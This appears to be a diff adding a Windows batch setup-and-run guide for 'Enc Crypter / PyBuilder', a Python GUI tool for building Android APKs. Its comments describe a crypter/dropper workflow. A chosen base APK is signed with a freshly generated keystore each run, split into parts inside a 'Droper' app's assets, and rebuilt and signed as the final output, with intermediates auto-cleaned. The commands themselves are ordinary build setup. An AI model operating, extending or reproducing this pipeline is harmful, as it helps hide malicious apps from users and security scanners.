@@ -1,0 +1,138 @@
+REM Enc Crypter / PyBuilder: One-shot setup-and-run guide for a fresh Windows system
+REM Save this file as cmd.txt and follow commands in a Windows CMD (Run as Administrator when needed)
+
+::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::
+:: 0) PREREQUISITES (Manual installs once)
+:: - Install Python 3.11+ (Add to PATH)
+:: - Install Java JDK 17 (e.g., C:\Program Files\Java\jdk-17) and set JAVA_HOME
+:: - Install Android SDK (Android Studio or cmdline-tools). Ensure Build-Tools installed (e.g., 33.x, 34.x, 35.x+)
+:: - Optional: Install Gradle system-wide (else project gradlew will be used if present)
+::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::
+
+REM --- Set environment (adjust paths to your system) ---
+SET "PY_PROJ_ROOT=%~dp0"
+REM %~dp0 expands to the folder of this cmd.txt; ensure the repo is at Enc Crypter\
+
+REM Update these two as per your machine:
+SET "JAVA_HOME=C:\Program Files\Java\jdk-17"
+SET "ANDROID_SDK_ROOT=%LOCALAPPDATA%\Android\Sdk"
+SET "ANDROID_HOME=%ANDROID_SDK_ROOT%"
+
+REM Add Java and Android tools to PATH for this session
+SET "PATH=%JAVA_HOME%\bin;%ANDROID_SDK_ROOT%\platform-tools;%ANDROID_SDK_ROOT%\build-tools\;C:\Windows\System32;%PATH%"
+
+ECHO [INFO] JAVA_HOME=%JAVA_HOME%
+ECHO [INFO] ANDROID_SDK_ROOT=%ANDROID_SDK_ROOT%
+
+::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::
+:: 1) Python environment
+::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::
+
+REM Create and activate a venv (optional but recommended)
+IF NOT EXIST "%PY_PROJ_ROOT%PyBuilder\.venv" (
+  ECHO [INFO] Creating venv...
+  python -m venv "%PY_PROJ_ROOT%PyBuilder\.venv"
+)
+CALL "%PY_PROJ_ROOT%PyBuilder\.venv\Scripts\activate.bat"
+
+REM Upgrade pip and install dependencies
+python -m pip install --upgrade pip
+REM Core GUI dep
+pip install PySide6
+REM Optional: if hashlib/zipfile etc. are standard lib; nothing else needed
+
+::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::
+:: 2) Android build-tools check (zipalign / apksigner)
+::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::
+
+REM Find latest Build-Tools folder and set a variable BUILD_TOOLS
+SET "BTROOT=%ANDROID_SDK_ROOT%\build-tools"
+IF NOT EXIST "%BTROOT%" (
+  ECHO [ERROR] Android SDK build-tools not found at %BTROOT%
+  ECHO Install via Android Studio SDK Manager > Build Tools, or via sdkmanager.
+  ECHO Example (if cmdline-tools installed):
+  ECHO   sdkmanager "build-tools;35.0.0" "platforms;android-35"
+  GOTO :POST
+)
+FOR /F "usebackq delims=" %%d IN (`dir /b /ad /o-n "%BTROOT%"`) DO (
+  SET "BUILD_TOOLS=%BTROOT%\%%d"
+  GOTO :BT_SET
+)
+:BT_SET
+ECHO [INFO] Using Build-Tools: %BUILD_TOOLS%
+IF NOT EXIST "%BUILD_TOOLS%\zipalign.exe" ECHO [WARN] zipalign.exe not found
+IF NOT EXIST "%BUILD_TOOLS%\apksigner.bat" ECHO [WARN] apksigner.bat not found
+
+::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::
+:: 3) First launch of the GUI
+::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::
+
+REM From project root run the PySide6 app
+PUSHD "%PY_PROJ_ROOT%PyBuilder"
+ECHO [INFO] Starting app GUI...
+python app.py
+POPD
+
+REM In the GUI, the typical flow on any machine is:
+REM  1) Paths auto-detect where possible. Verify/update fields:
+REM     - JDK: e.g., C:\Program Files\Java\jdk-17
+REM     - SDK: e.g., %LOCALAPPDATA%\Android\Sdk
+REM     - Build-Tools: e.g., %ANDROID_SDK_ROOT%\build-tools\35.0.0
+REM     - Gradle (optional): e.g., C:\Gradle\gradle-9.x\bin (or use project gradlew)
+REM     - Keystore File: pick a folder to store release.jks (or pick existing .jks file)
+REM  2) Select APK → Assets: choose base APK; it will copy as base1.apk into Droper assets
+REM  3) Sign Base Apk: signs base1.apk → dist\Sign Base Apk (v2/v3/v4), generating fresh keystore each time
+REM  4) Split Base Apk: splits the latest signed base APK into Droper assets parts
+REM  5) Compile with Dropper: builds the droper app → dist\Compile-Dropper
+REM  6) Sign Dropper Apk: signs latest compiled APK → dist\Final Output Apk
+REM     - After success, it auto-cleans dist\Compile-Dropper, dist\Sign Base Apk, and Droper assets
+
+::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::
+:: 4) If Gradle Wrapper fails
+::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::
+
+REM If Gradle wrapper is missing or wrapper JAR absent, you can use system Gradle:
+REM Ensure Gradle is installed and in PATH (or set GRADLE_HOME). Then:
+PUSHD "%PY_PROJ_ROOT%Droper"
+IF EXIST gradlew.bat (
+  ECHO [INFO] Using project gradlew
+  CALL gradlew.bat assembleDebug
+) ELSE (
+  ECHO [WARN] gradlew.bat not found, trying system gradle
+  gradle assembleDebug
+)
+POPD
+
+REM After build, the GUI already copies APK to dist\Compile-Dropper during Compile with Dropper
+
+::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::
+:: 5) Android SDK commandline (optional)
+::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::
+REM If you need to install build-tools via cmdline-tools (adjust paths):
+REM   SET "SDKMAN=%ANDROID_SDK_ROOT%\cmdline-tools\latest\bin"
+REM   "%SDKMAN%\sdkmanager.bat" --sdk_root="%ANDROID_SDK_ROOT%" "build-tools;35.0.0" "platforms;android-35"
+REM Accept licenses if prompted.
+
+::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::
+:: 6) Assets animations (optional aesthetics)
+::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::
+REM Place any of these files if desired:
+REM   %PY_PROJ_ROOT%assets\animations\hack1.gif
+REM   %PY_PROJ_ROOT%assets\animations\hack2.gif
+REM   %PY_PROJ_ROOT%assets\animations\hack3.gif
+REM   %PY_PROJ_ROOT%assets\animations\hack4.gif
+
+::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::
+:: 7) Troubleshooting quick notes
+::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::
+REM - zipalign header mismatch warnings are benign; we suppress/noise-filter in logs
+REM - If apksigner warns about native access, it is safe; signing still completes
+REM - Keystore is regenerated fresh (PKCS12) every time you click Sign Base/Dropper
+REM - Output locations:
+REM     Base signed → %PY_PROJ_ROOT%dist\Sign Base Apk\
+REM     Dropper compiled → %PY_PROJ_ROOT%dist\Compile-Dropper\
+REM     Dropper signed → %PY_PROJ_ROOT%dist\Final Output Apk\
+REM - After Dropper signing, intermediates and assets are auto-cleaned
+
+:POST
+ECHO [DONE] Read the instructions above. Adjust JAVA_HOME/ANDROID_SDK_ROOT and run the marked commands.
